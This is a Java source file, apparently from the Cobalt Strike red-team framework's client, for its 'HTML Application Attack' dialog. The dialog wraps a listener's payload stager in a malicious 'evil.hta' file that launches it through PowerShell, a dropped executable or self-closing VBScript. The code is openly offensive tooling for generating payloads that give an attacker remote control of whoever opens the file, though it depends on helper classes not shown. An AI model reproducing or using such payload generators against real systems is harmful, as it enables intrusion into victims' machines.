package aggressor.dialogs;

import aggressor.AggressorClient;
import common.CommonUtils;
import common.ListenerUtils;
import common.MutantResourceUtils;
import common.ScListener;
import dialog.DialogListener;
import dialog.DialogManager;
import dialog.DialogUtils;
import dialog.SafeDialogCallback;
import dialog.SafeDialogs;

import java.awt.event.ActionEvent;
import java.io.File;
import java.io.IOException;
import java.util.Map;
import javax.swing.JButton;
import javax.swing.JFrame;

public class HTMLApplicationDialog implements DialogListener, SafeDialogCallback {

    protected AggressorClient client;

    protected JFrame dialog = null;

    protected Map options;

    public HTMLApplicationDialog(AggressorClient aggressorClient) {
        this.client = aggressorClient;
    }

    public void dialogAction(ActionEvent actionEvent, Map map) {
        this.options = map;
        SafeDialogs.saveFile(null, "evil.hta", this);
    }

    public void dialogResult(String string) {
        String str1 = DialogUtils.string(this.options, "listener");
        String str2 = DialogUtils.string(this.options, "method");
        ScListener scListener = ListenerUtils.getListener(this.client, str1);
        byte[] arrby = scListener.getPayloadStager("x86");
        if ("PowerShell".equals(str2)) {
            CommonUtils.writeToFile(new File(string), (new MutantResourceUtils(this.client)).buildHTMLApplicationPowerShell(arrby));
        } else if ("Executable".equals(str2)) {
            String str = CommonUtils.strrep((new File(string)).getName(), ".hta", ".exe");
            byte[] arrby1 = (new MutantResourceUtils(this.client)).buildHTMLApplicationEXE(arrby, str);
            CommonUtils.writeToFile(new File(string), arrby1);
        } else if ("VBA".equals(str2)) {
            String str = "<html><head><script language=\"vbscript\">\n";
            str = str + CommonUtils.bString((new MutantResourceUtils(this.client)).buildVBS(arrby)) + "\n";
            str = str + "self.close\n";
            str = str + "</script></head></html>";
            CommonUtils.writeToFile(new File(string), CommonUtils.toBytes(str));
        }
        DialogUtils.showInfo("Congrats. You're the owner of an HTML app package.");
    }

    public void show() throws IOException {
        this.dialog = DialogUtils.dialog("HTML Application Attack", 640, 480);
        DialogManager dialogManager = new DialogManager(this.dialog);
        dialogManager.addDialogListener(this);
        dialogManager.sc_listener_stagers("listener", "Listener:", this.client);
        dialogManager.combobox("method", "Method:  ", CommonUtils.toArray("Executable, PowerShell, VBA"));
        JButton jButton1 = dialogManager.action("Generate");
        JButton jButton2 = dialogManager.help("https://www.cobaltstrike.com/help-html-application-attack");
        this.dialog.add(DialogUtils.description("This package generates an HTML application that runs a payload."), "North");
        this.dialog.add(dialogManager.layout(), "Center");
        this.dialog.add(DialogUtils.center(jButton1, jButton2), "South");
        this.dialog.pack();
        this.dialog.setVisible(true);
    }
}
